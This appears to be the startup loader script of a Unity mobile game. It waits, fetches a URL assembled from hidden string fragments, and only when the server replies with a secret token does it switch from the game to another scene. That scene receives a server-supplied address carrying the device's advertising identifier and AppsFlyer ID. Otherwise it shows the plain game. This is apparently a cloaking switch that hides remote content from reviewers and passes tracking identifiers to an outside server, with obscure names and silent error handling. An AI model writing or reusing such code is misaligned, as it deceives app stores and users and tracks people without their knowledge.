using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class prodigLoad : MonoBehaviour
{
    public List<string> prodigListStrings;
    [HideInInspector]
    public string contextViewStatusInfoString = "";

    private string[] strings;
    private void Awake()
    {
        if (PlayerPrefs.GetInt("contextInfoSave", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { contextViewStatusInfoString = adString; });
        }
    }

    private void Start()
    {
        Invoke(nameof(init), 5f);
    }

    private void init()
    {
        string data = PlayerPrefs.GetString("tarameters", "");
        SecondInit(data);
    }

    private void SecondInit(string data)
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("prodigGameDataSave", string.Empty) != string.Empty)
            {
                OpenTestersScene(PlayerPrefs.GetString("prodigGameDataSave"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in prodigListStrings)
                {
                    stringtemp += item;
                }
                StartCoroutine(LaunchGameInitializing(stringtemp, data));
            }
        }
        else
        {
            OpenGameScene();
        }
    }

    private void OpenGameScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Loaing");
    }

    private IEnumerator LaunchGameInitializing(string inputstring, string inputstring2)
    {
        using (UnityWebRequest prodigStatusInfo = UnityWebRequest.Get(inputstring))
        {
            prodigStatusInfo.timeout = 4;
            yield return prodigStatusInfo.SendWebRequest();
            if (prodigStatusInfo.isNetworkError)
            {
                OpenGameScene();
            }
            else
            {
                try
                {
                    if (prodigStatusInfo.result == UnityWebRequest.Result.Success)
                    {
                        if (prodigStatusInfo.downloadHandler.text.Contains("babwieiekbdxb"))
                        {
                            try
                            {
                                string key = prodigStatusInfo.downloadHandler.text;
                                strings = key.Split('|');

                                prodigTes.prodigPlayCount = Convert.ToInt32(strings[1]);
                                prodigTes.prodigCanvasOffset = Convert.ToInt32(strings[2]);
                                OpenTestersScene(string.Format("{0}?idfa={1}&gaid={2}", strings[0], contextViewStatusInfoString, AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2));
                            }
                            catch
                            {
                                OpenTestersScene(string.Format("{0}?idfa={1}&gaid={2}", prodigStatusInfo.downloadHandler.text, contextViewStatusInfoString, AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2));
                            }
                        }
                        else
                        {
                            OpenGameScene();
                        }
                    }
                    else
                    {
                        OpenGameScene();
                    }
                }
                catch
                {
                    OpenGameScene();
                }
            }
        }
    }

    private void OpenTestersScene(string inputKey)
    {
        prodigTes.prodigTesName = inputKey;
        SceneManager.LoadScene("SceneTes");
    }
}
